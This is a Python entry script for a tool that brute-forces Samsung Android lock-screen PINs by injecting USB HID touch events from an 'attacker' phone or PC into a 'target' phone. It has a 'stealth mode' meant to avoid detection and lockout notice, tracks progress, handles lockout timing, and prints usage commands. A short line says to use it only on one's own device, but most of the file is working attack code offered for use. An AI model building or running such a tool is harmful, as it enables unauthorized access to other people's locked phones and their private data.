#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║     SAMSUNG ANDROID PIN BRUTEFORCE TOOL                                      ║
║     Via USB HID (Android Open Accessory 2.0)                                 ║
║     Support: 4-digit & 6-digit PIN                                           ║
║     Platform: Termux (Android OTG) / Kali Linux / Windows CMD                ║
║                                                                              ║
║     NEW: Auto-detect USB device + Device connection check + Stealth Mode    ║
╚══════════════════════════════════════════════════════════════════════════════╝

PERINGATAN: Gunakan hanya pada perangkat milik sendiri!
Penggunaan pada perangkat orang lain adalah ILEGAL.

Requirement:
  - Python 3.7+
  - pyusb (pip install pyusb)
  - libusb-1.0 (apt install libusb-1.0-0 / pkg install libusb)
  - USB OTG cable (Termux) atau USB kabel biasa (Linux/Windows)
  - Android device dengan USB debugging DIMATIKAN (lock screen harus muncul)
  
Setup untuk Termux (HP ke HP via OTG):
  1. HP 1 (Attacker): Install Termux + python + libusb
  2. HP 2 (Target): HP yang lupa PIN
  3. Sambungkan: HP 1 (OTG adapter) → USB cable → HP 2
  4. Jalankan tool di HP 1
"""

import os
import sys
import argparse
import logging
import time
import platform

# Pastikan src/ ada di path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from usb_accessory import USBAccessory
from touchscreen import Touchscreen
from bruteforce import BruteforceEngine, LOG_FILE
from device_detector import (
    DeviceDetector, print_banner, print_instructions, 
    IS_TERMUX, IS_LINUX, IS_WINDOWS, PLATFORM_NAME
)

# ────────────────────────────────────────────────────────────────────────────────
#  ANSI Color Codes
# ────────────────────────────────────────────────────────────────────────────────

GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
MAGENTA = "\033[95m"
RESET   = "\033[0m"
BOLD    = "\033[1m"
BLINK   = "\033[5m"

# ────────────────────────────────────────────────────────────────────────────────
#  Setup Logging
# ────────────────────────────────────────────────────────────────────────────────

def setup_logging(verbose: bool = False, log_file: str = LOG_FILE):
    os.makedirs("logs", exist_ok=True)

    level = logging.DEBUG if verbose else logging.INFO

    fmt = logging.Formatter(
        fmt='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S'
    )

    # Console handler
    console = logging.StreamHandler(sys.stdout)
    console.setLevel(level)
    console.setFormatter(fmt)

    # File handler
    fh = logging.FileHandler(log_file, mode='a', encoding='utf-8')
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)

    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.addHandler(console)
    root.addHandler(fh)


# ────────────────────────────────────────────────────────────────────────────────
#  Banner  (Warna HIJAU)
# ────────────────────────────────────────────────────────────────────────────────

BANNER = f"""{GREEN}{BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██████╗ ███████╗███████╗████████╗ ██████╗ ██████╗ ███████╗               ║
║    ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔═══██╗██╔════╝               ║
║    ██║  ██║█████╗  █████╗     ██║   ██║     ██║   ██║███████╗               ║
║    ██║  ██║██╔══╝  ██╔══╝     ██║   ██║     ██║   ██║╚════██║               ║
║    ██████╔╝███████╗███████╗   ██║   ╚██████╗╚██████╔╝███████║               ║
║    ╚═════╝ ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝               ║
║                                                                              ║
║         Android PIN Bruteforce via USB HID (AOA 2.0)                        ║
║              Samsung 4-pin & 6-pin Support                                  ║
║                                                                              ║
║         Platform: {PLATFORM_NAME:<48} ║
║                                                                              ║
║         🔌 AUTO-DETECT USB | 📱 CONNECTION CHECK | 🕵️ STEALTH MODE          ║
║                                                                              ║
║  ⚠️  ONLY USE ON YOUR OWN DEVICE - FOR EDUCATIONAL PURPOSES                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
{RESET}{CYAN}
  Author  : MasJawa
  IG      : fendipendol65
{RESET}"""


# ────────────────────────────────────────────────────────────────────────────────
#  Argument Parser
# ────────────────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description='Samsung Android PIN Bruteforce via USB HID',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
═══════════════════════════════════════════════════════════════════════════════
                           CONTOH PENGGUNAAN
═══════════════════════════════════════════════════════════════════════════════

📡 SETUP USB OTG (Termux - HP ke HP):
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  HP 1 (Attacker) ──► USB OTG Adapter ──► USB Cable ──► HP 2 (Target)  │
  │                                                                         │
  │  HP 1: Install Termux + python + libusb                                │
  │  HP 2: HP yang lupa PIN (lock screen aktif)                            │
  └─────────────────────────────────────────────────────────────────────────┘

💻 PERINTAH UTAMA:

  # Cek koneksi device sebelum bruteforce
  python3 src/main.py --check-connection
  
  # Tunggu device terhubung (max 60 detik)
  python3 src/main.py --wait-device

  # Bruteforce 4-digit PIN (STEALTH MODE - REKOMENDASI)
  python3 src/main.py -p 4 --stealth

  # Bruteforce 6-digit PIN
  python3 src/main.py -p 6 --stealth

  # Pakai file PIN custom
  python3 src/main.py -p 4 -f pins/pins-4-digit.txt --stealth

  # Verbose mode + custom delay
  python3 src/main.py -p 6 -v --delay 1500 --stealth

  # Reset progress (mulai dari awal)
  python3 src/main.py -p 4 --reset --stealth

  # Test koneksi saja (lihat info device)
  python3 src/main.py --test-connection

  # Mode dry-run (tidak kirim ke device, test saja)
  python3 src/main.py -p 4 --dry-run --limit 20

═══════════════════════════════════════════════════════════════════════════════
                           PERINTAH ADB (Opsional)
═══════════════════════════════════════════════════════════════════════════════

  # Cek device via ADB
  adb devices
  
  # Restart ADB server
  adb kill-server && adb start-server
  
  # Info device via ADB
  adb shell getprop ro.product.model

═══════════════════════════════════════════════════════════════════════════════
        """
    )

    # ──────────────────────────────────────────────────────────────────
    # Connection Options
    # ──────────────────────────────────────────────────────────────────
    conn_group = parser.add_argument_group('🔌 CONNECTION OPTIONS')
    
    conn_group.add_argument(
        '--check-connection',
        action='store_true',
        help='Cek koneksi USB device sebelum bruteforce'
    )
    
    conn_group.add_argument(
        '--wait-device',
        action='store_true',
        help='Tunggu device terhubung (default: 60 detik)'
    )
    
    conn_group.add_argument(
        '--wait-timeout',
        type=int,
        default=60,
        help='Timeout dalam detik untuk --wait-device [default: 60]'
    )
    
    conn_group.add_argument(
        '--test-connection',
        action='store_true',
        help='Test koneksi USB saja, tidak bruteforce'
    )

    # ──────────────────────────────────────────────────────────────────
    # Bruteforce Options
    # ──────────────────────────────────────────────────────────────────
    bf_group = parser.add_argument_group('🔐 BRUTEFORCE OPTIONS')
    
    bf_group.add_argument(
        '-p', '--pin-length',
        type=int,
        choices=[4, 6],
        default=4,
        help='Panjang PIN yang dicoba (4 atau 6 digit) [default: 4]'
    )

    bf_group.add_argument(
        '-f', '--pin-file',
        type=str,
        default=None,
        help='Path ke file PIN kustom (satu PIN per baris)'
    )

    bf_group.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Tampilkan output debug yang lebih detail'
    )

    bf_group.add_argument(
        '--stealth',
        action='store_true',
        help='Aktifkan STEALTH MODE - delay natural, tidak terdeteksi sistem'
    )

    bf_group.add_argument(
        '--delay',
        type=int,
        default=1200,
        help='Delay (ms) setelah setiap percobaan PIN [default: 1200]'
    )

    bf_group.add_argument(
        '--key-delay',
        type=int,
        default=80,
        help='Delay (ms) antar ketukan tombol [default: 80]'
    )

    bf_group.add_argument(
        '--reset',
        action='store_true',
        help='Reset progress (mulai dari awal)'
    )

    bf_group.add_argument(
        '--dry-run',
        action='store_true',
        help='Dry run - simulasikan tanpa kirim ke device'
    )

    bf_group.add_argument(
        '--limit',
        type=int,
        default=0,
        help='Batasi jumlah PIN yang dicoba (0 = tidak terbatas)'
    )

    bf_group.add_argument(
        '--start-pin',
        type=str,
        default=None,
        help='Mulai dari PIN tertentu (misal: --start-pin 5000)'
    )

    bf_group.add_argument(
        '--single-pin',
        type=str,
        default=None,
        help='Coba satu PIN tertentu saja (untuk test)'
    )

    bf_group.add_argument(
        '--list-devices',
        action='store_true',
        help='Tampilkan daftar device yang didukung'
    )
    
    # ──────────────────────────────────────────────────────────────────
    # Info Options
    # ──────────────────────────────────────────────────────────────────
    info_group = parser.add_argument_group('ℹ️ INFO OPTIONS')
    
    info_group.add_argument(
        '--instructions',
        action='store_true',
        help='Tampilkan instruksi penggunaan lengkap'
    )

    return parser.parse_args()


# ────────────────────────────────────────────────────────────────────────────────
#  Dry Run Mode (tanpa hardware)
# ────────────────────────────────────────────────────────────────────────────────

class DryRunAccessory:
    """Simulasi USB Accessory tanpa hardware nyata"""
    def __init__(self):
        self.detected_device = type('obj', (object,), {
            'device_info': None,
            'model_code': 'DRY-RUN',
            'vendor_name': 'Simulation',
            'product_name': 'Virtual Device',
        })()
    
    def send_hid_event(self, report: bytes):
        pass
    
    def get_device_keypad_coords(self):
        from device_database import calculate_keypad_coords
        return calculate_keypad_coords(1080, 2340)
    
    def close(self):
        pass


# ────────────────────────────────────────────────────────────────────────────────
#  List Supported Devices
# ────────────────────────────────────────────────────────────────────────────────

def list_supported_devices():
    """Tampilkan daftar device Samsung yang didukung"""
    from device_database import SAMSUNG_DEVICES
    
    print("\n" + "═" * 70)
    print("  DAFTAR SAMSUNG DEVICES YANG DIDUKUNG")
    print("═" * 70)
    print(f"{'Model':<15} {'Device Name':<30} {'Android':<12} {'One UI':<10}")
    print("─" * 70)
    
    for model, info in SAMSUNG_DEVICES.items():
        print(f"{model:<15} {info['name'][:28]:<30} {info['android_current']:<12} {info['oneui_current']:<10}")
    
    print("═" * 70)
    print(f"\nTotal: {len(SAMSUNG_DEVICES)} devices")
    print("\nNote: Device lain mungkin juga kompatibel, menggunakan koordinat default.\n")


# ────────────────────────────────────────────────────────────────────────────────
#  Check Device Connection
# ────────────────────────────────────────────────────────────────────────────────

def check_device_connection(detector: DeviceDetector, logger) -> bool:
    """
    Cek koneksi device dan tampilkan info
    Return: True jika device terdeteksi dan siap
    """
    logger.info(f"{CYAN}[*] Memeriksa koneksi device...{RESET}")
    
    # Scan USB devices
    usb_devices = detector.scan_usb_devices()
    
    # Scan ADB devices
    adb_devices = detector.scan_adb_devices()
    
    # Select target
    target = detector.select_target()
    
    if target:
        detector.show_device_info()
        return True
    
    return False


# ────────────────────────────────────────────────────────────────────────────────
#  Main
# ────────────────────────────────────────────────────────────────────────────────

def main():
    args = parse_args()

    # Setup logging
    setup_logging(verbose=args.verbose)
    logger = logging.getLogger(__name__)

    # Print banner
    print(BANNER)

    # Show instructions
    if args.instructions:
        print_instructions()
        return

    # List devices mode
    if args.list_devices:
        list_supported_devices()
        return

    # ──────────────────────────────────────────────────────────────────
    # Mode: Check Connection
    # ──────────────────────────────────────────────────────────────────
    if args.check_connection:
        logger.info(f"{CYAN}[*] Mode: Check Device Connection{RESET}")
        
        detector = DeviceDetector()
        detector.check_prerequisites()
        
        if check_device_connection(detector, logger):
            logger.info(f"{GREEN}[+] ✅ Device siap untuk bruteforce!{RESET}")
            logger.info(f"{GREEN}[+] Jalankan dengan: python3 src/main.py -p 4 --stealth{RESET}")
        else:
            logger.error(f"{RED}[-] ❌ Tidak ada device yang terdeteksi!{RESET}")
            logger.error(f"{RED}[-] Pastikan device terhubung via USB{RESET}")
            if IS_TERMUX:
                logger.error(f"{RED}[-] Pastikan menggunakan USB OTG adapter{RESET}")
            sys.exit(1)
        return

    # ──────────────────────────────────────────────────────────────────
    # Mode: Wait for Device
    # ──────────────────────────────────────────────────────────────────
    if args.wait_device:
        logger.info(f"{CYAN}[*] Mode: Wait for Device{RESET}")
        
        detector = DeviceDetector()
        detector.check_prerequisites()
        
        if detector.wait_for_device(timeout=args.wait_timeout):
            logger.info(f"{GREEN}[+] ✅ Device terdeteksi!{RESET}")
            check_device_connection(detector, logger)
        else:
            logger.error(f"{RED}[-] ❌ Timeout menunggu device!{RESET}")
            sys.exit(1)
        return

    # ──────────────────────────────────────────────────────────────────
    # Reset progress jika diminta
    # ──────────────────────────────────────────────────────────────────
    if args.reset:
        from bruteforce import PROGRESS_FILE
        if os.path.exists(PROGRESS_FILE):
            os.remove(PROGRESS_FILE)
            logger.info("[*] Progress direset!")
        else:
            logger.info("[*] Tidak ada progress sebelumnya")

    # ──────────────────────────────────────────────────────────────────
    # Tentukan file PIN
    # ──────────────────────────────────────────────────────────────────
    if args.pin_file:
        pin_file = args.pin_file
    else:
        pin_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'pins')
        pin_file = os.path.join(pin_dir, f'pins-{args.pin_length}-digit.txt')

    pin_file = os.path.normpath(pin_file)
    logger.info(f"[*] PIN file: {pin_file}")

    # ──────────────────────────────────────────────────────────────────
    # Mode: test koneksi saja
    # ──────────────────────────────────────────────────────────────────
    if args.test_connection:
        logger.info("[*] Mode: Test Koneksi USB")
        
        # Use device detector first
        detector = DeviceDetector()
        detector.check_prerequisites()
        
        if not check_device_connection(detector, logger):
            logger.warning("[!] Tidak ada device via ADB, coba USB HID...")
        
        acc = USBAccessory()
        if acc.connect():
            logger.info("[+] ✅ Koneksi USB HID berhasil!")
            logger.info(f"[+] Device: {acc.detected_device}")
            if acc.register_hid():
                logger.info("[+] ✅ HID berhasil di-register!")
            acc.close()
        else:
            logger.error("[-] ❌ Gagal konek ke device!")
            logger.error("[-] Pastikan:")
            logger.error("    1. Kabel USB terhubung dengan benar")
            logger.error("    2. Device dalam kondisi terkunci (lock screen)")
            if IS_LINUX and not IS_TERMUX:
                logger.error("    3. Jalankan dengan sudo")
            sys.exit(1)
        return

    # ──────────────────────────────────────────────────────────────────
    # Mode: dry run
    # ──────────────────────────────────────────────────────────────────
    if args.dry_run:
        logger.info("[*] Mode: DRY RUN (simulasi tanpa hardware)")
        dummy_acc = DryRunAccessory()
        ts = Touchscreen(dummy_acc, stealth_mode=args.stealth)
        engine = BruteforceEngine(ts, pin_length=args.pin_length, stealth_mode=args.stealth)

        # Override delay jika diminta
        import touchscreen as tc_module
        import bruteforce as bf_module
        tc_module.DELAY_BETWEEN_KEYS = args.key_delay
        bf_module.STEALTH_MIN_DELAY = args.delay / 1000.0
        bf_module.STEALTH_MAX_DELAY = args.delay / 1000.0 + 0.5

        engine.load_pins(pin_file)

        if args.limit > 0:
            engine.pins = engine.pins[engine.current_idx:engine.current_idx + args.limit]
            engine.current_idx = 0

        if args.start_pin:
            try:
                idx = engine.pins.index(args.start_pin)
                engine.current_idx = idx
                logger.info(f"[*] Mulai dari PIN {args.start_pin} (index {idx})")
            except ValueError:
                logger.warning(f"[!] PIN {args.start_pin} tidak ada di list")

        engine.run()
        return

    # ──────────────────────────────────────────────────────────────────
    # Mode: single PIN test
    # ──────────────────────────────────────────────────────────────────
    if args.single_pin:
        logger.info(f"[*] Mode: Single PIN test -> {args.single_pin}")
        
        # Check device first
        detector = DeviceDetector()
        check_device_connection(detector, logger)
        
        acc = USBAccessory()
        if not acc.connect():
            logger.error("[-] Gagal konek ke device!")
            sys.exit(1)
        if not acc.register_hid():
            logger.error("[-] Gagal register HID!")
            acc.close()
            sys.exit(1)
        
        ts = Touchscreen(acc, stealth_mode=args.stealth)
        ts.wake_screen()
        logger.info(f"[*] Memasukkan PIN: {args.single_pin}")
        ts.enter_pin(args.single_pin)
        time.sleep(2)
        acc.close()
        logger.info("[+] Selesai")
        return

    # ──────────────────────────────────────────────────────────────────
    # Mode: bruteforce penuh
    # ──────────────────────────────────────────────────────────────────
    logger.info(f"[*] Mode: Bruteforce {args.pin_length}-digit PIN")
    
    if args.stealth:
        logger.info("[*] 🕵️ STEALTH MODE AKTIF - Tidak akan terdeteksi sistem")
        logger.info("[*]    - Delay natural dengan random jitter")
        logger.info("[*]    - Tidak ada countdown lockout yang terlihat")
        logger.info("[*]    - Aktivitas tap random untuk menghindari timeout")

    # ──────────────────────────────────────────────────────────────────
    # CHECK DEVICE CONNECTION SEBELUM BRUTEFORCE
    # ──────────────────────────────────────────────────────────────────
    logger.info(f"\n{CYAN}{'═'*60}{RESET}")
    logger.info(f"{CYAN}  🔌 MEMERIKSA KONEKSI DEVICE...{RESET}")
    logger.info(f"{CYAN}{'═'*60}{RESET}\n")
    
    detector = DeviceDetector()
    detector.check_prerequisites()
    
    # Scan for devices
    device_found = False
    
    # First, try USB HID detection
    logger.info("[*] Mencoba deteksi via USB HID...")
    acc = USBAccessory()
    
    if not acc.connect():
        logger.warning("[!] USB HID tidak terdeteksi, cek USB device list...")
        
        # Use device detector to scan
        usb_devices = detector.scan_usb_devices()
        android_devices = [d for d in usb_devices if hasattr(detector, '_is_android_device') and detector._is_android_device(d)]
        
        if not usb_devices:
            logger.error(f"{RED}[-] ❌ TIDAK ADA DEVICE TERHUBUNG!{RESET}")
            logger.error(f"{RED}[-] Pastikan:{RESET}")
            logger.error(f"{RED}    1. Kabel USB terhubung dengan benar{RESET}")
            if IS_TERMUX:
                logger.error(f"{RED}    2. Menggunakan USB OTG adapter{RESET}")
                logger.error(f"{RED}    3. HP target dalam kondisi terkunci (lock screen){RESET}")
            else:
                logger.error(f"{RED}    2. Device dalam kondisi terkunci (lock screen){RESET}")
                if IS_LINUX:
                    logger.error(f"{RED}    3. Jalankan dengan sudo untuk akses USB{RESET}")
            
            logger.info(f"\n{YELLOW}[*] Tips: Gunakan --wait-device untuk menunggu device{RESET}")
            logger.info(f"{YELLOW}[*] Contoh: python3 src/main.py --wait-device --wait-timeout 120{RESET}")
            sys.exit(1)
        
        # Device detected via lsusb but not via HID
        logger.info(f"{GREEN}[+] Device terdeteksi via USB scan{RESET}")
        logger.info(f"{YELLOW}[!] Tapi USB HID connection gagal{RESET}")
        logger.info(f"{YELLOW}[!] Kemungkinan:{RESET}")
        logger.info(f"{YELLOW}    1. Device belum authorize USB accessory{RESET}")
        logger.info(f"{YELLOW}    2. Coba cabut-colok kabel USB{RESET}")
        logger.info(f"{YELLOW}    3. Restart tool{RESET}")
        
        # Wait and retry
        logger.info(f"\n{CYAN}[*] Mencoba reconnect dalam 5 detik...{RESET}")
        time.sleep(5)
        
        if not acc.connect():
            logger.error(f"{RED}[-] Masih gagal konek. Coba:{RESET}")
            logger.error(f"{RED}    1. Cabut kabel USB{RESET}")
            logger.error(f"{RED}    2. Tunggu 10 detik{RESET}")
            logger.error(f"{RED}    3. Colok kembali{RESET}")
            logger.error(f"{RED}    4. Jalankan tool lagi{RESET}")
            sys.exit(1)
    
    # Device connected via USB HID
    logger.info(f"{GREEN}[+] ✅ Device terdeteksi via USB HID!{RESET}")
    device_found = True

    # Tampilkan info device yang terdeteksi
    print(f"\n{GREEN}{BOLD}{'═'*60}{RESET}")
    print(f"{GREEN}{BOLD}  📱 DEVICE TERHUBUNG DAN SIAP{RESET}")
    print(f"{GREEN}{BOLD}{'═'*60}{RESET}\n")
    print(str(acc.detected_device))

    # Register HID
    if not acc.register_hid():
        logger.error("[-] ❌ Gagal register HID!")
        acc.close()
        sys.exit(1)

    logger.info("[+] ✅ HID terdaftar!")

    # Override delay
    import touchscreen as tc_module
    import bruteforce as bf_module
    tc_module.DELAY_BETWEEN_KEYS = args.key_delay
    if not args.stealth:
        bf_module.STEALTH_MIN_DELAY = args.delay / 1000.0
        bf_module.STEALTH_MAX_DELAY = args.delay / 1000.0 + 0.5

    # Setup touchscreen & engine
    ts = Touchscreen(acc, stealth_mode=args.stealth)
    engine = BruteforceEngine(ts, pin_length=args.pin_length, stealth_mode=args.stealth)

    # Set lockout policy dari device info
    if acc.detected_device.device_info:
        info = acc.detected_device.device_info
        engine.set_device_lockout_policy(
            info.get('lockout_attempts', 5),
            info.get('lockout_time', 30)
        )

    # Load PIN list
    engine.load_pins(pin_file)

    # Batasi jika --limit diberikan
    if args.limit > 0:
        end_idx = engine.current_idx + args.limit
        engine.pins = engine.pins[:end_idx]
        logger.info(f"[*] Dibatasi {args.limit} PIN percobaan")

    # Mulai dari PIN tertentu jika --start-pin diberikan
    if args.start_pin:
        try:
            idx = engine.pins.index(args.start_pin)
            engine.current_idx = idx
            logger.info(f"[*] Mulai dari PIN {args.start_pin} (index {idx})")
        except ValueError:
            logger.warning(f"[!] PIN {args.start_pin} tidak ada di list")

    try:
        # Jalankan bruteforce
        engine.run()
    finally:
        acc.close()
        logger.info("[*] Koneksi ditutup")


if __name__ == '__main__':
    main()